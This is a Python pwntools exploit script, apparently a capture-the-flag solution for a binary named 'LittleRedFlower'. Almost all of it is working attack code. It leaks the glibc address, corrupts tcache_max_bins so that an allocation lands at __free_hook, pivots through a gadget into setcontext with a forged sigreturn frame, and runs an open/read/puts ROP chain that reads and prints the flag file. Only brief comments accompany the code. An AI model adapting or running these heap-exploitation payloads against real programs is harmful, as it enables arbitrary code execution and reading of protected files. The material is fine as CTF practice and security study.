# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './LittleRedFlower'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-arm', binary,'-g','1234'])
    #p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

ru(' 0x')
leak = rint()
lg('leak' , leak)
libc.address = leak - libc.sym['_IO_2_1_stdout_']
tcache_max_bins = 0x1ea2d0 + libc.address
__free_hook = libc.sym['__free_hook']
setcontext = libc.sym['setcontext'] + 61
magic = 0x0000000000154B90 + libc.address

pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
pop_rsp_ret = libc.search(asm('pop rsp; ret')).next()
pop_rdx_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()

read_addr = libc.sym["read"]
open_addr = libc.sym["open"]
puts_addr = libc.sym["puts"]

fake_frame = SigreturnFrame()
fake_frame['uc_stack.ss_size'] = setcontext
fake_frame.rdi = 0
fake_frame.rsi = __free_hook 
fake_frame.rdx = 0x200
fake_frame.rsp = __free_hook 
fake_frame.rip = read_addr


sa('anywhere' , p64(tcache_max_bins + 1))
sa('what?' , '\xff')

sla('Offset' , 2280 )
# 设置 tcache 管理块指定位置大小的偏移
sa('Content' , p64(__free_hook))
# 布置 entry ，让下次分配能分配到此处
sla('size' , 0x1600)

payload = flat(
    magic , __free_hook + 0x28 ,
    0 , 0 , 
    setcontext
) + str(fake_frame)

# mov     rdx, [rdi+8]
# mov     [rsp+0C8h+var_C8], rax
# call    qword ptr [rdx+20h]
# mov     qword ptr [rbx], 0
# mov     rax, [rsp+0C8h+var_C8]
# jmp     loc_154AA4

lg('magic',magic)
# dbg('free')
sa('>>' , payload)

flag_addr = __free_hook + 0x100
orw = flat(
    pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
    pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_rbx_ret , 0x100 , 0 , read_addr,
    pop_rdi_ret , flag_addr , puts_addr
).ljust(0x100,'\x00') + 'flag\x00'

raw_input()
se(orw)

# dbg()

p.interactive()

'''
@File    :   LittleRedFlower.py
@Time    :   2021/09/21 13:32:21
@Author  :   Niyah 
'''